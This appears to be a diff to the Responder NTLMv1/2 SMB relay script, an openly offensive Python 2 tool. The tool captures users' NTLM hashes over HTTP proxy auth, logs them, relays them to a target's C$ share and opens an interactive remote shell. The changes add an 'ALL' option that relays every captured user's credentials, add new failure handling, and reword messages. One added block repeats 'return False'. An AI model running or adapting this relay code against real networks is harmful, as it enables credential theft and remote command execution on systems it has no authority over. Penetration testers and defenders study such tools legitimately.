@@ -55,7 +55,7 @@ def ShowWelcome():
     print '\n\033[1;34mResponder Proxy Auth to SMB NTLMv1/2 Relay 0.2\nSupporting NTLMv1 and NTLMv2.'
     print 'Send bugs/hugs/comments to: laurent.gaffie@gmail.com'
     print 'Usernames to relay (-u) are case sensitive.'
-    print 'To kill this script hit CRTL-C or <Enter>.\033[1;31m\n'
+    print 'To kill this script hit CRTL-C.\033[1;31m\n'
     print 'Use this script in combination with Responder.py for best results.'
     print 'Do not to use Responder.py with -P set. This tool does the same'
     print 'than -P but with cross-protocol NTLM relay. Always target a box ' 
@@ -127,7 +127,7 @@ def ParseHTTPHash(data, key, client):
 		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, key.encode("hex"))
 		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                 print "[+] Received NTLMv1 hash from: %s"%(client)
-                if User in UserToRelay:
+                if User in UserToRelay or "ALL" in UserToRelay:
                         print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
                         if ReadData("SMBRelay-Session.txt", client, User, HostName, Host[0], cmd=None):
                            return None, None
@@ -148,7 +148,7 @@ def ParseHTTPHash(data, key, client):
 		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, key.encode("hex"), NTHash[:32], NTHash[32:])
 		WriteData(Logs_Path+"logs/SMB-Relay-"+client+".txt", WriteHash, User)
                 print "[+] Received NTLMv2 hash from: %s"%(client)
-                if User in UserToRelay:
+                if User in UserToRelay or "ALL" in UserToRelay:
                         print "[+] Username: %s is whitelisted, fowarding credentials."%(User)
                         if ReadData("SMBRelay-Session.txt", client, User, Domain, Host[0], cmd=None):
                            return None, None
@@ -284,7 +284,7 @@ def RunPsExec(Host):
     data, s, clientIP, Username, Domain = GetCredentials
 
     if data[8:10] == "\x73\x6d":
-        print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target.\n[+] Hashes were saved anyways in Responder/logs/ folder."
+        print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n"
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
         return False
     if data[8:10] == "\x73\x8d":
@@ -295,7 +295,6 @@ def RunPsExec(Host):
     ## First, check if user has admin privs on C$:    
     ## Tree Connect
     if data[8:10] == "\x73\x00":
-        print "[+] Authenticated.\n"
         GetSessionResponseFlags(data)#Verify if the target returned a guest session.
         head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
         t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\C$")
@@ -307,7 +306,14 @@ def RunPsExec(Host):
 
     ## Fail Handling.
     if data[8:10] == "\x75\x22":
-        print "[+] Tree Connect AndX denied. SMB Signing is likely mandatory on the target, or this is a low privileged user.\n[+] Hashes were saved anyways in Responder/logs/ folder."
+        print "[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n"
+        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
+        return False
+        return False
+
+    ## Fail Handling.
+    if data[8:10] == "\x75\xcc":
+        print "[+] Tree Connect AndX denied. Bad Network Name returned."
         return False
 
     ## Tree Connect
@@ -323,7 +329,7 @@ def RunPsExec(Host):
 
     ## Go to NtCreateAndx
     if data[8:10] == "\x75\x00":
-        print "[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
+        print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
 
     while True:
         if data[8:10] == "\x75\x00":
@@ -376,4 +382,5 @@ if __name__ == '__main__':
         main()
     except:
         raise
+
 
